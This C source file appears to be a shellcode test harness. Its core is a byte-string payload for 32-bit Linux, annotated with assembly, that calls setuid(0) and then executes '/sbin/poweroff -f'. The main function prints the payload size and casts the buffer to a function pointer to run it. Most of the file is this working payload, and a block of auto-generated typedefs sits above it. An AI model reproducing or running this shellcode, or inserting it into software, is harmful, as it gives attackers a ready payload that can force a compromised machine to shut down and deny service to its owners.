#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
typedef  int /*<<< orphan*/  shellcode ;

/* Variables and functions */
 int /*<<< orphan*/  printf (char*,int) ; 
 void stub1 () ; 

int main()
{
	char shellcode[] = 
			"\x31\xdb"		// xor ebx,ebx
			"\x6a\x17"		// push byte 0x17
			"\x58"			// pop eax
			"\xcd\x80"		// int 80h
			"\x8d\x43\x0b"		// lea eax,[ebx+0xb]
			"\x99"			// cdq
			"\x52"			// push edx
			"\x66\x68\x66\x66"	// push word 0x6666
			"\x68\x77\x65\x72\x6f"	// push dword 0x6f726577
			"\x68\x6e\x2f\x70\x6f"	// push dword 0x6f702f6e
			"\x68\x2f\x73\x62\x69"	// push dword 0x6962732f
			"\x89\xe3"		// mov ebx,esp
			"\x52"			// push edx
			"\x66\x68\x2d\x66"	// push word 0x662d
			"\x89\xe1"		// mov ecx,esp
			"\x52"			// push edx
			"\x51"			// push ecx
			"\x53"			// push ebx
			"\x89\xe1"		// mov ecx,esp
			"\xcd\x80" ;		// int 80h

	printf("[*] ShellCode size (bytes): %d\n\n", sizeof(shellcode)-1 );
	(*(void(*)()) shellcode)();
	
	return 0;
}